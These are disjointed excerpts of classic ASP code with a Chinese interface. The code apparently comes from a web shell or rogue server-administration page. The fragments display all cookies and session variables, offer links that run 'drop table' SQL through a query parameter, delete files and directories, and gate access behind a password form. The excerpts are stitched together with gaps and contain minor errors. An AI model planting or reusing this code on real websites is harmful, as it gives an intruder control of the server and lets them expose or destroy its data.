...
Response.Write "<b>response.cookies('"&Item &"')('"&ItemKey&"')</b>="& Request.Cookies(Item)(ItemKey)& "<a href='?showsc=yes&delcookies="&item&"'>删除</a><br>"
Next
Else
Response.Write "<b>response.cookies('"&Item &"')</b>="& Request.Cookies(Item) & "<a href='?showsc=yes&delcookies="&item&"'>删除</a><br>"
End If
Next
%>
      </td>
...
Response.Write "session('"&strName & ")(" & iLoop & ") = " & Session(strName)(iLoop) & "<a href='?showsc=yes&delsession="&strname&"'>删除</a><BR>"
Next
Else
Response.Write "session('"&strName & "') = " & Session.Contents(strName) & "<a href='?showsc=yes&delsession="&strname&"'>删除</a><BR>"
End If
next
%>
      </td>
...
response.write"<td align=center><a href='?sqlstr=drop table "&rs("TABLE_NAME")&"' title='删除"&rs("TABLE_NAME")&"数据表'>删除</a><br><br>"
...
set fs=nothing
Response.write "<center>删除成功！</center>"
response.write"<script>opener.window.location.reload()</script>"
response.write"<meta http-equiv='refresh' content='2;URL=javascript:window.close()'>"
end sub
...
Response.write "<center>目录"&dirpath&"<br>删除成功！</center>"
response.write"<script>opener.window.location.reload()</script>"
response.write"<meta http-equiv='refresh' content='2;URL=javascript:window.close()'>"
end sub

sub loginform()
response.write"<br><br> <br><br><form action='"&filename&"' method='post' name='lform'>请输入密码：<input name='loginpass' type='password' size='15'>&nbsp;<input type='submit' value='登录'></form>"
end sub
...
Sub copyright()
response.write"<cneter><a href="&filename&"?logout=yes>退出登录</a><center>"
End Sub
%>
</body>
  </center>
